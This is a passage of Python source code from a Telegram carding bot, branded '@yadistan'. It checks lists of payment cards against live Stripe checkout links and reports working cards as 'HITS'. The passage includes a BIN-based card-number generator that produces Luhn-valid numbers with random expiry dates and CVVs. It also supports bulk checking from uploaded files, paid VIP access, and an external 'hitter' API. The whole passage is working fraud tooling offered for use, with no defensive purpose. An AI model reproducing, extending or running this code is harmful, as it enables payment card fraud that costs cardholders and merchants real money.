                    )
                else:
                    _st = result.get('status', '')
                    _msg = result.get('message', 'N/A')
                    if _st == '3ds' or any(k in _msg.lower() for k in ('3d', 'authenticate', 'otp', 'authentication')):
                        _display_status = "OTP Required 🔐"
                    else:
                        _display_status = f"{_msg}"
                    _cc_show2        = country_code if country_code not in ('N/A', '??', '', 'Unknown') else ''
                    _country_disp2   = country if country != 'Unknown' else '—'
                    _country_line2   = f"{_country_disp2} ({_cc_show2})" if _cc_show2 else _country_disp2
                    _bank_disp2      = bank if bank != 'Unknown' else '—'
                    _bin_disp2       = bin_info if bin_info not in ('Unknown', 'Unknown - ') else '—'
                    formatted_message = (
                        f"<b>— ─── D E C L I N E D ─── —\n"
                        f"╔══════════════════════════╗\n"
                        f"║  ❌  DEAD  —  DECLINED    ║\n"
                        f"╚══════════════════════════╝\n"
                        f"│\n"
                        f"│ 💳 <code>{card}</code>\n"
                        f"│ 💬 {_display_status}\n"
                        f"│\n"
                        f"│ 🌐 Site: {result.get('merchant','N/A')}\n"
                        f"│ 💵 Amount: {result.get('amount','N/A')}\n"
                        f"│\n"
                        f"│ 🏦 BIN: {_bin_disp2}\n"
                        f"│ 🏛️ Bank: {_bank_disp2}\n"
                        f"│ 🌍 Country: {_country_line2}\n"
                        f"│\n"
                        f"│ 🎯 Gate: Ext Stripe Checkout\n"
                        f"│ ⏱️ {result.get('time','N/A')}  ·  Total: {execution_time:.2f}s\n"
                        f"└──────────────────────────\n"
                        f"       ⌤ Bot by @yadistan</b>"
                    )
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=formatted_message, reply_markup=minux_keyboard)
                except:
                    pass
                return

            # --- Multiple cards ---
            total = len(card_lines)
            live = dead = insufficient = checked = 0
            hits = []
            results_lines = []

            stop_kb = types.InlineKeyboardMarkup()
            stop_btn = types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop')
            stop_kb.add(stop_btn)

            try:
                stopuser[f'{id}']['status'] = 'start'
            except:
                stopuser[f'{id}'] = {'status': 'start'}

            log_command(message, query_type='gateway', gateway='ext_stripe_mass')
            msg = bot.reply_to(message,
                f"<b>🌐 𝗘𝘅𝘁 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗠𝘂𝗹𝘁𝗶\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 𝗧𝗼𝘁𝗮𝗹: {total} 𝗰𝗮𝗿𝗱𝘀\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"⏳ 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴...</b>", reply_markup=stop_kb)

            def build_multi_msg(status_text="⏳ Checking..."):
                if "DONE" in status_text or "Complete" in status_text:
                    _top = "✨ ✦ ─── C O   D O N E ─── ✦ ✨"
                elif "STOP" in status_text:
                    _top = "🛑 ─── S T O P P E D ─── 🛑"
                else:
                    _top = "✨ ✦ ─── C O   C H E C K E R ─── ✦ ✨"
                header = (
                    f"<b>{_top}\n"
                    f"╔══════════════════════════╗\n"
                    f"║  🌐  Ext Stripe Checkout  ║\n"
                    f"╚══════════════════════════╝\n"
                    f"│\n"
                    f"│ 📋 {checked}/{total} checked   {status_text}\n"
                    f"│ ✅ Live: {live}   💰 Funds: {insufficient}   ❌ Dead: {dead}\n"
                    f"└──────────────────────────\n"
                )
                body = "\n".join(results_lines[-10:])
                footer_hits = ""
                if hits:
                    _hlabels = {"✅": "✅ HIT (Paid)", "💰": "💰 HIT (Funds)", "⚠️": "⚠️ HIT (OTP)"}
                    hits_lines = "".join(
                        f"\n╔══ {_hlabels.get(em,'🎯 HIT')} ══╗\n"
                        f"│ <code>{cc}</code>\n"
                        f"│ 🌐 {res.get('merchant','N/A')}\n"
                        f"│ 💵 {res.get('amount','N/A')}\n"
                        f"└────────────\n"
                        for cc, res, em in hits
                    )
                    footer_hits = f"\n🎯 <b>HITS ({len(hits)})</b>" + hits_lines
                return header + body + footer_hits + "\n✨ ✦ ─────────────── ✦ ✨\n       ⌤ Bot by @yadistan</b>"

            _live_hit_holder = [None, []]
            for cc in card_lines:
                if stopuser.get(f'{id}', {}).get('status') == 'stop':
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_multi_msg("🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗"))
                    except:
                        pass
                    return

                result = _co_ext_call(checkout_url, cc)
                checked += 1
                log_card_check(id, cc, 'ext_stripe_mass',
                               f"{result.get('status')} | {result.get('message')}")

                status_emoji = _ext_status(result)
                if status_emoji == "✅":
                    live += 1; hits.append((cc, result, status_emoji)); _add_to_merge(id, cc); _notify_live_hit(message.chat.id, cc, "co", holder=_live_hit_holder)
                elif status_emoji == "💰":
                    insufficient += 1; hits.append((cc, result, status_emoji)); _add_to_merge(id, cc); _notify_live_hit(message.chat.id, cc, "co", holder=_live_hit_holder)
                elif status_emoji == "⚠️":
                    live += 1
                else:
                    dead += 1

                results_lines.append(
                    f"{status_emoji} <b>{_ext_line(result)}</b>  ·  {result.get('message','')[:40]}\n    └ <code>{cc}</code>"
                )

                try:
                    stop_kb2 = types.InlineKeyboardMarkup()
                    stop_kb2.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=build_multi_msg(), reply_markup=stop_kb2, parse_mode='HTML')
                except:
                    pass

            minux_keyboard = types.InlineKeyboardMarkup()
            minux_keyboard.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))
            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_multi_msg("✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!"), reply_markup=minux_keyboard)
            except:
                pass
            return

        # ====== BIN MODE (auto-gen) ======
        second_parts = second_line.split()
        bin_input = second_parts[0]
        amount = int(second_parts[1]) if len(second_parts) > 1 and second_parts[1].isdigit() else 15
        if amount < 1: amount = 1
        if amount > 100: amount = 100

        has_pipe = '|' in bin_input
        if has_pipe:
            card_parts = bin_input.split('|')
            bin_base = card_parts[0].strip()
            mm_template = card_parts[1].strip() if len(card_parts) > 1 else 'xx'
            yy_template = card_parts[2].strip() if len(card_parts) > 2 else 'xx'
            cvv_template = card_parts[3].strip() if len(card_parts) > 3 else 'xxx'
        else:
            bin_base = bin_input.replace('x', '').replace('X', '')
            mm_template = 'xx'
            yy_template = 'xx'
            cvv_template = 'xxx'

        if len(bin_base.replace('x', '').replace('X', '')) < 6:
            bot.reply_to(message, "<b>❌ 𝗕𝗜𝗡 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗮𝘁 𝗹𝗲𝗮𝘀𝘁 6 𝗱𝗶𝗴𝗶𝘁𝘀.</b>")
            return

        is_amex = bin_base[0] == '3'
        card_length = 15 if is_amex else 16
        cvv_length = 4 if is_amex else 3

        def luhn_check(card_number):
            digits = [int(d) for d in card_number]
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            total = sum(odd_digits)
            for d in even_digits:
                total += sum(divmod(d * 2, 10))
            return total % 10 == 0

        def generate_card():
            cc = ''
            for ch in bin_base:
                if ch.lower() == 'x':
                    cc += str(random.randint(0, 9))
                else:
                    cc += ch
            while len(cc) < card_length - 1:
                cc += str(random.randint(0, 9))
            for check_digit in range(10):
                test = cc + str(check_digit)
                if luhn_check(test):
                    cc = test
                    break
            if mm_template.lower() in ['xx', 'x', '']:
                mm = str(random.randint(1, 12)).zfill(2)
            else:
                mm = mm_template.zfill(2)
            current_year = datetime.now().year % 100
            if yy_template.lower() in ['xx', 'x', '']:
                yy = str(random.randint(current_year + 1, current_year + 5)).zfill(2)
            else:
                yy = yy_template.zfill(2)
            if cvv_template.lower() in ['xxx', 'xxxx', 'xx', 'x', '']:
                cvv = str(random.randint(1000, 9999)) if is_amex else str(random.randint(100, 999)).zfill(3)
            else:
                cvv = cvv_template.zfill(cvv_length)
            return f"{cc}|{mm}|{yy}|{cvv}"

        cards = []
        seen = set()
        attempts = 0
        while len(cards) < amount and attempts < amount * 5:
            card = generate_card()
            if card not in seen:
                seen.add(card)
                cards.append(card)
            attempts += 1

        total = len(cards)
        bin_num = bin_base[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)

        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}

        stop_keyboard = types.InlineKeyboardMarkup()
        stop_keyboard.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))

        _flag_icon   = _flag(country_code)
        _cc_display  = country_code if country_code not in ('N/A', '??', '') else ''
        _country_ln  = f"🌍 {_flag_icon} {country}" + (f"  ({_cc_display})" if _cc_display else "")
        log_command(message, query_type='gateway', gateway='ext_stripe_bin')
        msg = bot.reply_to(message,
            f"<b>⚡ EXT STRIPE × BIN GEN\n"
            f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            f"🎯 BIN: <code>{bin_num}</code>   {bin_info}\n"
            f"🏦 {bank}\n"
            f"{_country_ln}   |   📋 {total} cards\n"
            f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            f"⏳ Initializing...</b>", reply_markup=stop_keyboard, parse_mode='HTML')

        live = dead = insufficient = checked = 0
        three_ds = 0
        hits = []
        results_lines = []

        def build_bin_msg(status_text="⏳ Checking..."):
            pct  = int(checked / total * 100) if total else 0
            bar  = _prog_bar(checked, total, 12)
            _cc  = country_code if country_code not in ('N/A', '??', '') else ''
            _fi  = _flag_icon   # flag emoji or ''
            country_line = f"🌍 {_fi} {country}" + (f"  ({_cc})" if _cc else "")
            header = (
                f"<b>⚡ EXT STRIPE × BIN GEN  |  {status_text}\n"
                f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                f"🎯 BIN: <code>{bin_num}</code>   {bin_info}\n"
                f"🏦 {bank}\n"
                f"{country_line}\n"
                f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                f"[{bar}] {pct}%\n"
                f"📊 <b>{checked}/{total}</b>  ┃  ✅ <b>{live}</b>  ┃  💰 <b>{insufficient}</b>  ┃  ⚠️ <b>{three_ds}</b>  ┃  ❌ <b>{dead}</b>\n"
                f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            )
            body = "\n".join(results_lines[-10:])
            footer_hits = ""
            if hits:
                _hlabels = {"✅": "✅ HIT (Paid)", "💰": "💰 HIT (Funds)", "⚠️": "⚠️ HIT (OTP)"}
                hits_block = "".join(
                    f"\n╔══ {_hlabels.get(em,'🎯 HIT')} ══╗\n"
                    f"│ <code>{cc}</code>\n"
                    f"│ 🌐 {res.get('merchant','N/A')}\n"
                    f"│ 💵 {res.get('amount','N/A')}\n"
                    f"│ ⏱️ {res.get('time','N/A')}\n"
                    f"└────────────\n"
                    for cc, res, em in hits[-6:]
                )
                footer_hits = f"\n🎯 <b>HITS ({len(hits)})</b>" + hits_block
            full = header + body + footer_hits + "\n✨ ✦ ─────────────── ✦ ✨\n       <i>⌤ Bot by @yadistan</i></b>"
            if len(full) > 4000:
                full = header + "\n".join(results_lines[-5:]) + footer_hits + "\n       <i>⌤ @yadistan</i></b>"
            return full

        for cc in cards:
            if stopuser.get(f'{id}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=build_bin_msg("🛑 STOPPED"), parse_mode='HTML')
                except:
                    pass
                return

            cc = cc.strip()
            result = _co_ext_call(checkout_url, cc)
            checked += 1
            log_card_check(id, cc, 'ext_stripe_bin',
                           f"{result.get('status')} | {result.get('message')}")

            status_emoji = _ext_status(result)
            if status_emoji == "✅":
                live += 1
                hits.append((cc, result, '✅'))
            elif status_emoji == "💰":
                insufficient += 1
                hits.append((cc, result, '💰'))
            elif status_emoji == "⚠️":
                three_ds += 1
                hits.append((cc, result, '⚠️'))
            else:
                dead += 1

            results_lines.append(_fmt_result_line(status_emoji, cc, result))

            try:
                stop_kb2 = types.InlineKeyboardMarkup()
                stop_kb2.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_bin_msg(), parse_mode='HTML', reply_markup=stop_kb2)
                time.sleep(0.3)
            except Exception:
                time.sleep(0.8)

        minux_keyboard = types.InlineKeyboardMarkup()
        minux_keyboard.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))
        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                  text=build_bin_msg("✅ DONE"), parse_mode='HTML',
                                  reply_markup=minux_keyboard)
        except:
            pass

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== External API Checkout Command (/xco) ==================
# /xco — self-hosted API running on the same EC2 machine (keep_alive.py / Flask)
# Always use localhost so it works regardless of the server's public IP.
_XCO_BASE  = "http://127.0.0.1:8099"
_XCO_API   = f"{_XCO_BASE}/api/stripe"
_XCO_KEY   = os.environ.get("API_SECRET_KEY", "")   # empty = no auth required

# Cache: stores (is_alive: bool, checked_at: float) — re-checks every 5 minutes
_XCO_ALIVE_CACHE = (None, 0.0)
_XCO_CACHE_TTL   = 300   # seconds

def _xco_api_alive():
    global _XCO_ALIVE_CACHE
    is_alive, checked_at = _XCO_ALIVE_CACHE
    if is_alive is not None and (time.time() - checked_at) < _XCO_CACHE_TTL:
        return is_alive
    try:
        r = requests.get(f"{_XCO_BASE}/api/info", timeout=5)
        alive = r.status_code == 200
    except Exception:
        alive = False
    _XCO_ALIVE_CACHE = (alive, time.time())
    return alive

def _xco_call(checkout_url, cc):
    """Direct ext_stripe_check call — no Flask/HTTP round-trip to avoid circular import."""
    try:
        res = ext_stripe_check(checkout_url, cc)
        st  = res.get("status", "").lower()
        msg = res.get("message", "N/A")
        merchant = res.get("merchant", "N/A")
        amount   = res.get("amount",   "N/A")
        elapsed  = res.get("time",     "N/A")
        msg_low  = msg.lower()
        if st in ("approved", "charged"):
            emoji = "✅"
        elif st == "insufficient_funds" or "insufficient" in msg_low:
            emoji = "💰"
        elif st == "3ds" or any(k in msg_low for k in ("3d", "otp", "authenticate", "requires_action")):
            emoji = "⚠️"
        elif st == "expired":
            emoji = "🚫"
        elif st == "captcha":
            emoji = "🤖"
        elif st == "error" and any(k in msg_low for k in ("session", "key", "url", "parse")):
            emoji = "⚠️"
        else:
            emoji = "❌"
        raw = f"{emoji} | {msg} | {merchant} | {amount} | Time: {elapsed}"
        return emoji, raw
    except Exception as e:
        return "❌", f"Error: {str(e)[:60]}"

def _fmt_xco_line(emoji, cc, resp):
    """Parse API plain-text response → short attractive Telegram line."""
    parts   = resp.split(" | ")
    msg     = parts[1].strip() if len(parts) > 1 else resp
    merchant= parts[2].strip() if len(parts) > 2 else ""
    amount  = parts[3].strip() if len(parts) > 3 else ""
    elapsed = ""
    for p in parts:
        if "Time:" in p:
            elapsed = p.replace("Time:", "").strip()
            break
    msg = (msg
           .replace("Your card was declined.", "Declined")
           .replace("Your card was declined", "Declined")
           .replace("Your card is declined", "Declined")
           .replace("Your card has insufficient funds.", "Insufficient Funds")
           .replace("Your card has insufficient funds", "Insufficient Funds")
           .replace("Payment Approved", "Approved ✨")
           .replace("3DS Required", "3DS Required 🔐")
           .replace("Card tokenization failed", "Invalid Card")
           .replace("Checkout URL expired / already used", "Expired / Already Used 🚫")
           .replace("hCaptcha / Bot Detection triggered", "hCaptcha Detected 🤖")
           .replace("Your order has been updated. Please review the updated total and submit payment again.", "Order Updated")
           .replace("Your order has been updated.", "Order Updated"))
    meta = []
    if merchant and merchant not in ("N/A", ""):
        meta.append(merchant)
    if amount and amount not in ("N/A", ""):
        meta.append(amount)
    if elapsed:
        meta.append(f"⏱{elapsed}")
    meta_str = "  •  ".join(meta)
    line = f"{emoji} <code>{cc}</code>"
    if meta_str:
        return f"{line}\n    ┗ {msg}  •  {meta_str}"
    return f"{line}\n    ┗ {msg}"


# ================== /h — Hitter API (gold-newt hitter.php) ==================
@bot.message_handler(commands=["h"])
def h_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'

        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ This command is only for VIP users.</b>", parse_mode='HTML')
            return

        allowed, wait = check_rate_limit(id, BL)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ Wait {wait}s before next check.</b>", parse_mode='HTML')
            return

        usage_msg = (
            "<b>🎯 <u>Hitter Checker</u>\n\n"
            "━━━━━━━━━━━━━━━━\n"
            "📌 <b>Card Mode:</b>\n"
            "<code>/h https://checkout.stripe.com/xxx\n"
            "4111111111111111|12|26|123</code>\n\n"
            "📌 <b>Same line:</b>\n"
            "<code>/h https://checkout.stripe.com/xxx 4111...|12|26|123</code>\n\n"
            "📌 <b>BIN Mode (auto-gen):</b>\n"
            "<code>/h https://checkout.stripe.com/xxx\n"
            "374355 10</code>\n"
            "<i>(BIN + count, default 15, max 50)</i>\n\n"
            "📌 <b>Reply to /gen message:</b>\n"
            "Reply to any CC message → <code>/h https://...</code>\n\n"
            "📌 <b>Reply to .txt file:</b>\n"
            "Reply to .txt → <code>/h https://...</code>\n"
            "━━━━━━━━━━━━━━━━</b>"
        )

        replied = message.reply_to_message

        # ── Helper: run multi-card check loop ──────────────────────────
        def _run_bulk(checkout_url, card_lines, src_label):
            total = len(card_lines)
            live = dead = insufficient = otp = checked = 0
            hits = []
            results_lines = []

            stop_kb = types.InlineKeyboardMarkup()
            stop_kb.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
            try:
                stopuser[f'{id}']['status'] = 'start'
            except:
                stopuser[f'{id}'] = {'status': 'start'}

            # ── DLX: Analyze checkout URL before starting ──────────────────
            _dlx_info = {'merchant': 'N/A', 'product': 'N/A', 'amount': None, 'provider': 'Unknown'}
            try:
                _dlx_info = _dlx_url_analyze(checkout_url)
            except Exception:
                pass
            _dlx_merchant  = _dlx_info.get('merchant', 'N/A') or 'N/A'
            _dlx_product   = _dlx_info.get('product', 'N/A')  or 'N/A'
            _dlx_amount    = _dlx_info.get('amount')  or 'N/A'
            _dlx_provider  = _dlx_info.get('provider', 'Unknown') or 'Unknown'

            log_command(message, query_type='gateway', gateway='h_hitter')
            msg = bot.reply_to(message,
                f"<b>🎯 Hitter → {src_label}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 Total: {total} cards\n"
                f"🌐 Merchant: {_dlx_merchant}\n"
                f"📦 Product: {_dlx_product}\n"
                f"💵 Amount: {_dlx_amount}\n"
                f"🔌 Gateway: {_dlx_provider}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"⏳ Starting...</b>",
                reply_markup=stop_kb, parse_mode='HTML')

            def _prog(done, total, w=12):
                f = round(w * done / total) if total else 0
                return '█' * f + '░' * (w - f)

            def build_h_msg(status_text="⏳ Checking..."):
                if "DONE" in status_text:
                    banner = "🏁 ═══════ HITTER DONE ═══════ 🏁"
                elif "STOP" in status_text:
                    banner = "🛑 ════════ STOPPED ════════ 🛑"
                else:
                    banner = "⚡ ════════ HITTER ════════ ⚡"

                pct = round(checked / total * 100) if total else 0
                bar = _prog(checked, total)

                header = (
                    f"<b>{banner}\n"
                    f"┌─────────────────────────────┐\n"
                    f"│  🎯 <u>{_dlx_provider} Hitter</u>\n"
                    f"│  🌐 {_dlx_merchant}\n"
                    f"│  💵 {_dlx_amount}   📋 {src_label}\n"
                    f"├─────────────────────────────┤\n"
                    f"│  [{bar}] {pct}%\n"
                    f"│  🔢 {checked}/{total}   {status_text}\n"
                    f"├─────────────────────────────┤\n"
                    f"│  ✅ Live: {live}   💰 Funds: {insufficient}\n"
                    f"│  ⚠️ OTP/3DS: {otp}   ❌ Dead: {dead}\n"
                    f"└─────────────────────────────┘\n"
                )
                body = "\n".join(results_lines[-8:])
                footer_hits = ""
                if hits:
                    hits_lines = "".join(
                        f"\n┌── 🎯 {_h_word(res).upper()} ──\n"
                        f"│ 💳 <code>{cc}</code>\n"
                        f"│ 💬 {res.get('message','N/A')[:60]}\n"
                        f"└──────────────\n"
                        for cc, res, em in hits[-6:]
                    )
                    footer_hits = f"\n🔥 <b>HITS ({len(hits)})</b>" + hits_lines
                full = header + body + footer_hits + "\n⌤ @yadistan</b>"
                if len(full) > 4000:
                    full = header + "\n".join(results_lines[-4:]) + footer_hits + "\n⌤ @yadistan</b>"
                return full

            for cc in card_lines:
                if stopuser.get(f'{id}', {}).get('status') == 'stop':
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_h_msg("🛑 STOPPED"), parse_mode='HTML')
                    except: pass
                    return

                cc = cc.strip()
                result = _h_call(checkout_url, cc)
                checked += 1
                log_card_check(id, cc, 'h_hitter', result.get('raw', '')[:80])

                em   = _h_emoji(result)
                word = _h_word(result)
                st   = result.get('status', '')

                if st == 'approved':
                    live += 1
                    hits.append((cc, result, em))
                    results_lines.append(f"✅ <b>LIVE</b>  ·  {result.get('message','')[:40]}\n    └ <code>{cc}</code>")
                elif st == 'insufficient_funds':
                    insufficient += 1
                    hits.append((cc, result, em))
                    results_lines.append(f"💰 <b>FUNDS</b>  ·  {result.get('message','')[:40]}\n    └ <code>{cc}</code>")
                elif st == '3ds':
                    otp += 1
                    results_lines.append(f"⚠️ <b>OTP/3DS</b>  ·  {result.get('message','')[:40]}\n    └ <code>{cc}</code>")
                else:
                    dead += 1
                    results_lines.append(f"❌ <b>Dead</b>  ·  {result.get('message','')[:40]}\n    └ <code>{cc}</code>")

                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=build_h_msg(), parse_mode='HTML',
                                          reply_markup=stop_kb)
                except Exception:
                    time.sleep(0.5)

            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_h_msg("✅ DONE"), parse_mode='HTML')
            except: pass

        # ── Mode 1: Reply to .txt file ──────────────────────────────────
        if (replied and replied.document
                and replied.document.file_name
                and replied.document.file_name.lower().endswith('.txt')):
            txt_parts = message.text.split()
            if len(txt_parts) < 2:
                bot.reply_to(message,
                    "<b>❌ URL missing.\n\nUsage: reply to .txt file with:\n"
                    "<code>/h https://checkout.stripe.com/xxx</code></b>", parse_mode='HTML')
                return
            checkout_url = txt_parts[1].strip()
            if not checkout_url.startswith('http'):
                bot.reply_to(message, "<b>❌ Invalid URL.</b>", parse_mode='HTML')
                return
            wm = bot.reply_to(message, "<b>⏳ Downloading file...</b>", parse_mode='HTML')
            try:
                fi = bot.get_file(replied.document.file_id)
                dl = bot.download_file(fi.file_path)
                raw_txt = dl.decode('utf-8', errors='ignore')
            except Exception as e:
                bot.edit_message_text(f"<b>❌ Download failed: {str(e)[:80]}</b>",
                                      chat_id=message.chat.id, message_id=wm.message_id,
                                      parse_mode='HTML')
                return
            bot.delete_message(message.chat.id, wm.message_id)
            card_lines = [_extract_cc(l.strip()) for l in raw_txt.splitlines() if _extract_cc(l.strip())]
            if not card_lines:
                bot.reply_to(message, "<b>❌ No valid CCs found in file.</b>", parse_mode='HTML')
                return
            _run_bulk(checkout_url, card_lines, f"📄 {replied.document.file_name} ({len(card_lines)} cards)")
            return

        # ── Mode 2: Reply to gen/CC text message ────────────────────────
        if replied and not (replied.document and replied.document.file_name
                            and replied.document.file_name.lower().endswith('.txt')):
            cmd_parts = message.text.split()
            if len(cmd_parts) >= 2 and cmd_parts[1].startswith('http'):
                replied_text = replied.text or replied.caption or ""
                reply_cards = []
                seen_r = set()
                for _rl in replied_text.splitlines():
                    _cc = _extract_cc(_rl.strip())
                    if _cc and _cc not in seen_r:
                        reply_cards.append(_cc)
                        seen_r.add(_cc)
                if reply_cards:
                    _run_bulk(cmd_parts[1], reply_cards, f"📋 Message ({len(reply_cards)} cards)")
                    return

        # ── Mode 3: Inline URL + card(s) ─────────────────────────────────
        # Handles all formats:
        #   /h <url> <card>               (same line)
        #   /h <url>\n<card>              (url same line, card next)
        #   /h\n<url>\n<card>             (url on 2nd line — dot style)
        try:
            _lines = [l.strip() for l in message.text.split('\n') if l.strip()]
            _first_tokens = _lines[0].split(None, 1)
            _first_rest   = _first_tokens[1].strip() if len(_first_tokens) > 1 else ''

            if _first_rest.startswith('http'):
                # /h <url> ...
                checkout_url = _first_rest.split()[0]
                _after_url   = _first_rest[len(checkout_url):].strip()
                _remaining   = ([_after_url] if _after_url else []) + _lines[1:]
            elif len(_lines) > 1 and _lines[1].startswith('http'):
                # /h\n<url>\n<card>  — dot style
                checkout_url = _lines[1].split()[0]
                _remaining   = _lines[2:]
            else:
                raise IndexError

            raw_lines = _remaining
        except (IndexError, ValueError):
            bot.reply_to(message, usage_msg, parse_mode='HTML')
            return

        if not checkout_url.startswith('http'):
            bot.reply_to(message, "<b>❌ Invalid URL.</b>", parse_mode='HTML')
            return

        card_lines = []
        for _rl in raw_lines:
            _cc = _extract_cc(_rl)
            if _cc:
                card_lines.append(_cc)
        card_lines = card_lines[:10]

        # ── BIN Mode fallback: if no full CC found, try BIN auto-gen ───────
        if not card_lines and raw_lines:
            _bin_line   = raw_lines[0]
            _bin_parts  = _bin_line.split()
            _bin_input  = _bin_parts[0]
            _bin_amount = int(_bin_parts[1]) if len(_bin_parts) > 1 and _bin_parts[1].isdigit() else 15
            if _bin_amount < 1:  _bin_amount = 1
            if _bin_amount > 50: _bin_amount = 50

            _has_pipe = '|' in _bin_input
            if _has_pipe:
                _bp = _bin_input.split('|')
                _bin_base    = _bp[0].strip()
                _mm_tpl      = _bp[1].strip() if len(_bp) > 1 else 'xx'
                _yy_tpl      = _bp[2].strip() if len(_bp) > 2 else 'xx'
                _cvv_tpl     = _bp[3].strip() if len(_bp) > 3 else 'xxx'
            else:
                _bin_base = _bin_input.replace('x','').replace('X','')
                _mm_tpl = _yy_tpl = 'xx'; _cvv_tpl = 'xxx'

            if len(_bin_base) >= 6 and _bin_base.isdigit():
                _is_amex    = _bin_base[0] == '3'
                _card_len   = 15 if _is_amex else 16
                _cvv_len    = 4  if _is_amex else 3

                def _h_luhn(num):
                    d = [int(x) for x in num]
                    return (sum(d[-1::-2]) + sum(sum(divmod(x*2,10)) for x in d[-2::-2])) % 10 == 0

                def _h_gen_card():
                    cc = _bin_base[:]
                    while len(cc) < _card_len - 1:
                        cc += str(random.randint(0, 9))
                    for ck in range(10):
                        if _h_luhn(cc + str(ck)):
                            cc += str(ck); break
                    mm  = _mm_tpl  if _mm_tpl  not in ('xx','x','')  else str(random.randint(1,12)).zfill(2)
                    yr  = datetime.now().year % 100
                    yy  = _yy_tpl  if _yy_tpl  not in ('xx','x','')  else str(random.randint(yr+1,yr+5)).zfill(2)
                    cvv = _cvv_tpl if _cvv_tpl not in ('xxx','xxxx','xx','x','') else (
                        str(random.randint(1000,9999)) if _is_amex else str(random.randint(100,999)).zfill(3))
                    return f"{cc}|{mm}|{yy}|{cvv}"

                _gen_seen = set(); card_lines = []
                for _ in range(_bin_amount * 5):
                    if len(card_lines) >= _bin_amount: break
                    gc = _h_gen_card()
                    if gc not in _gen_seen:
                        _gen_seen.add(gc); card_lines.append(gc)

                if card_lines:
                    _bin_num6 = _bin_base[:6]
                    _bi, _bk, _bc, _bcc = get_bin_info(_bin_num6)
                    _run_bulk(checkout_url, card_lines,
                              f"🎰 BIN {_bin_num6} ({_bi}) — {len(card_lines)} cards")
                    return

            bot.reply_to(message, usage_msg, parse_mode='HTML')
            return

        if not card_lines:
            bot.reply_to(message, usage_msg, parse_mode='HTML')
            return

        # Multi-card inline
        if len(card_lines) > 1:
            _run_bulk(checkout_url, card_lines, f"Inline ({len(card_lines)} cards)")
            return

        # Single card
        card = card_lines[0]
        bin_num = card.replace('|', '')[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)
        log_command(message, query_type='gateway', gateway='h_hitter')
        msg = bot.reply_to(message,
            f"<b>⏳ Checking...\n"
            f"🎯 Link: <code>{checkout_url[:50]}...</code>\n"
            f"💳 Card: <code>{card}</code></b>", parse_mode='HTML')

        t0 = time.time()
        result = _h_call(checkout_url, card)
        elapsed = round(time.time() - t0, 2)
        log_card_check(id, card, 'h_hitter', result.get('raw', '')[:80])

        em   = _h_emoji(result)
        word = _h_word(result)
        is_hit = em in ("✅", "💰", "⚠️")

        out = (
            f"<b>{em} {word}  ❯  <code>{card}</code>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"🏦 BIN: {bin_num}  •  {bin_info}\n"
            f"🏛️ Bank: {bank}\n"
            f"🌍 Country: {country} {country_code}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"🏪 Merchant: {result.get('merchant','N/A')}\n"
            f"💵 Amount: {result.get('amount','N/A')}\n"
            f"📝 Message: {result.get('message','N/A')[:150]}\n"
            f"⏱️ Time: {result.get('time', f'{elapsed}s')}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"[⌤] Bot by @yadistan</b>"
        )
        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                  text=out, parse_mode='HTML')
        except:
            bot.reply_to(message, out, parse_mode='HTML')

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== /ah — Auto Hitter (stripe-hitter.onrender.com Checkout API) ==================
_AH_API_BASE = os.environ.get("AH_API_BASE", "https://stripe-hitter.onrender.com")

def _ah_gate(url):
    """Auto-detect gate type from URL."""
